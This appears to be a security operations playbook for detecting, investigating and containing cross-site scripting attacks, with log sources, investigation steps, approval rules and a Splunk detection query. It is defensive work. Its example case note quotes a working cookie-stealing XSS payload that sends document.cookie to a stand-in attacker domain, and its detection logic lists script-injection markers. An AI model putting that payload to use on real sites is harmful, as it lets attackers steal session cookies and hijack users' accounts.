# XSS - Cross-Site Scripting Exploitation

## Playbook ID & Name
**WEB-002** - Cross-Site Scripting (Reflected, Stored, DOM-Based) Detection and Response

## Business Risk
**[STAKEHOLDER]** - A successful XSS attack lets an outsider run JavaScript inside a legitimate user's (or admin's) browser session on our site, which means they can steal session cookies, submit forms as that user, or quietly redirect customers to a credential-harvesting page - all while the URL bar still says our domain. On a customer-facing app this is a trust and fraud problem; on an internal admin console it's a privilege-escalation problem. Decision authority for taking a customer-facing page offline sits with the Application Owner and Head of Engineering; the SOC does not unilaterally kill a revenue-generating page without that sign-off unless active session hijacking is confirmed.

## Severity/Priority default
**Medium** at initial detection (single blocked/reflected payload, no confirmed execution). Escalates to **High** if a payload executed against a real user session, and to **Critical** if the target was an admin/privileged console, an authentication page, or if cookie/token exfiltration to an external host is confirmed.

## MITRE ATT&CK Technique(s)
- **T1190** - Exploit Public-Facing Application (the underlying flaw being abused)
- **T1566.002** - Phishing: Link (when the XSS payload is delivered via a crafted URL sent to a victim - the classic reflected-XSS delivery chain)
- **T1539** - Steal Web Session Cookie (the actual objective of most exploited XSS: the injected script reads `document.cookie` or an in-page token and ships it to an attacker-controlled collection endpoint)

## Trigger / Detection Logic Summary
Alert fires when a WAF, reverse proxy, or application log parser flags an HTTP request containing script-injection syntax (`<script>`, `onerror=`, `javascript:`, encoded variants like `%3Cscript%3E`, `String.fromCharCode`, `eval(`, `document.cookie`) in a query string, POST body, header (Referer, User-Agent, X-Forwarded-For), or a stored field later rendered without encoding. A second detection path looks for outbound requests from browsers on the corporate network, or from customer sessions where telemetry exists, to newly-registered or low-reputation domains within 5 minutes of visiting a page known to reflect unsanitized input — that window is a starting point, not a hard cutoff; widen it if the page load and the outbound beacon are on different logging clocks.

## Required Log Sources & Event Sources
| Source | What to pull |
|---|---|
| WAF (ModSecurity/OWASP CRS, Cloudflare, AWS WAF, Azure Front Door WAF) | Blocked/logged rule hits, CRS 941xxx-class XSS rules, rule ID, action taken, matched payload, anomaly score |
| Web/app server access logs (Nginx, Apache, IIS W3C) | `cs-uri-query`, request method, status code, `Referer`, `User-Agent`, timestamp, client IP |
| Application/error logs | Server-side exceptions from malformed input, template rendering errors |
| CDN/edge logs | Cache-hit status on the malicious response (tells you if a stored payload got served to other users) |
| Browser/RUM or CSP report-uri endpoint | `csp-violation-report` entries - gold-standard evidence a payload actually executed in a real browser |
| Session/auth logs | New session creation immediately following a suspicious request, session token reuse from a new IP |

*Note: this attack chain lives almost entirely at the HTTP/application layer. There are no Windows Event IDs or Sysmon IDs specific to XSS - don't go hunting for one. If the payload later pivots into a Windows host (e.g., a stolen admin session used to touch internal tooling), that becomes a separate playbook.*

## Key Fields to Inspect

**[ANALYST]**
- Full decoded request: URL-decode and, if double-encoded, decode again - attackers routinely use `%253C` or HTML-entity encoding (`&lt;script&gt;`) to slip past naive WAF regex.
- `Referer` header - reflected XSS delivered via phishing link often shows the victim arriving from a webmail link-click proxy or a URL shortener, not from normal site navigation.
- Response body of the flagged request (if WAF logged it) - confirm the payload was actually reflected/rendered, not just submitted and rejected server-side.
- Whether the field is stored (comment, profile bio, support ticket) - if stored, you must find every subsequent request that rendered that record, because every viewer is a potential victim.
- CSP report `blocked-uri` and `violated-directive` - tells you exactly what the injected script tried to do (load a remote script, exfil via `img src`, etc.).
- Destination of any outbound beacon (`document.location=`, `fetch(`, `new Image().src=`) - domain age, WHOIS, VT reputation.

## Normal vs Suspicious Pattern
| Normal | Suspicious |
|---|---|
| User input containing `<`, `>`, `&` from legitimate use (code snippets in a support form, HTML pasted by mistake) that gets HTML-encoded on output | Same characters rendered raw/unencoded in the response, confirmed by CSP violation or reflected in page source |
| Automated scanners (Qualys, internal DAST/pentest) hitting the app with XSS test strings from a known scanner IP/schedule | Payload arriving from an unrecognized external IP outside any approved scan window, with a real exfil domain rather than a scanner canary string |
| Single blocked WAF hit, no repeat | Iterative payloads from the same source - encoding variations, tag-name fuzzing - indicating manual bypass attempts |

## Investigation Steps

**Default lookback:** 24 hours for a reflected payload. For a stored payload, widen to cover the full time the poisoned record has existed in the database (check the CMS/ticket/profile edit history for its creation date) — a comment or bio field can sit live and rendering to every visitor for weeks before anyone reports it, so a 24-hour window will under-count victims.

1. Pull the raw flagged request(s) from the WAF/app log and fully decode the payload; identify reflected vs stored vs DOM-based (check if the payload only appears client-side via a JS sink, which server-side logs won't show).
2. Determine the injection point (query param, form field, header, stored record) and whether the vulnerable page requires authentication.
3. If stored, search access/CDN logs for every request that rendered the poisoned record and identify potential victims (session IDs, account IDs, IPs).
4. Check CSP report-uri / browser telemetry for `blocked-uri` entries confirming actual execution, not just an attempted-and-rejected request.
5. Identify the outbound destination the payload calls out to (if any); check DNS/proxy logs for corporate hosts resolving or connecting to it around the same timestamp.
6. Correlate with authentication logs: did any session get created, elevated, or reused from a new IP within roughly 30 minutes after a victim would have hit the payload (cookie theft is typically used quickly, but check out to the full lookback window from the note above before ruling it out)?
7. If a live session was likely hijacked, coordinate with the app team to invalidate affected session tokens/cookies server-side.
8. Confirm with engineering whether the vulnerable field/parameter has output encoding, a Content-Security-Policy, or input validation - or is missing all three.

## True Positive Indicators
- Script tag or event-handler payload rendered unencoded in a live HTTP response.
- CSP violation report confirming a script actually attempted to execute in a real browser.
- Confirmed outbound connection from a victim session to an attacker-registered domain carrying cookie/token data in the URL or POST body.
- Stored payload served to multiple distinct visitor sessions from the CDN cache.

## False Positive / Benign Positive Indicators
- Authorized pentest or DAST scan (Burp Suite, OWASP ZAP, internal red team) hitting the endpoint from a known scanner IP/window - confirm against the test calendar.
- Legitimate content (code documentation site, markdown preview feature) containing angle brackets that are correctly encoded on output - WAF false-positived on the raw request without checking the rendered response.
- Security researcher submitting a bug-bounty proof-of-concept against a staging/sandbox environment with no real victim traffic - Benign Positive, route to the bug bounty/AppSec queue rather than closing as a non-event.

## Escalation Criteria
Escalate to AppSec/Engineering on-call immediately if: the vulnerable page is authentication, password-reset, or an admin console; a CSP violation confirms execution against a real (non-scanner) session; or stored XSS is confirmed live in production and actively being served. Escalate to IR/Fraud if session hijacking of a customer or privileged account is confirmed.

## Containment Options & Approval Authority

**[MANAGEMENT]** WAF virtual-patch (block/challenge the specific parameter pattern) can be applied by SOC/AppSec on-call without further sign-off - this is the default first move and buys time. Taking the affected page or feature offline requires Application Owner approval (Engineering Manager or above); for a customer-facing checkout/login flow, Head of Engineering or the designated incident commander must approve, given revenue impact. Force-invalidating all active sessions for the affected app is an IR-lead decision requiring the Application Owner's sign-off, logged in the incident ticket with a timestamp and named approver. Permanent fix (output encoding, CSP rollout, input validation) is tracked as an engineering ticket with a target SLA, not closed purely at the SOC layer.

## Example Query (Splunk SPL - WAF/access log)
```spl
index=web_waf OR index=access_logs earliest=-24h latest=now
| rex field=_raw "(?i)(?<xss_payload><script|onerror=|javascript:|document\.cookie|%3Cscript)"
| where isnotnull(xss_payload)
| stats count min(_time) as first_seen max(_time) as last_seen
        values(uri_query) as payloads by src_ip, dest_host, uri_path
| where count > 0
| sort - count
```

## Closure Criteria
Close when the injection point has been confirmed remediated (output encoding or WAF virtual-patch in place), no evidence of successful execution or session compromise exists (or affected sessions have been invalidated if it did), and AppSec has an engineering ticket open for the permanent fix if one wasn't already deployed. Valid closures include True Positive (with remediation), Benign Positive (encoded correctly, WAF over-flagged), or Insufficient Evidence (payload blocked pre-execution, no reflection confirmed, source could not be attributed to a known scanner or actor).

**Example case-note line:** "2026-09-15 14:12 UTC - Reflected XSS payload (`<script>fetch('https://evil-collect.example.net/c?'+document.cookie)</script>`) blocked by WAF rule set on `store.example.com/search?q=` from external IP 203.0.113.50; CSP report-uri shows zero violations for the affected page in the surrounding 24h window - no evidence of successful execution against real user sessions. Closing as Benign Positive; AppSec ticket APP-4471 opened to add output encoding on the search-term echo field regardless."
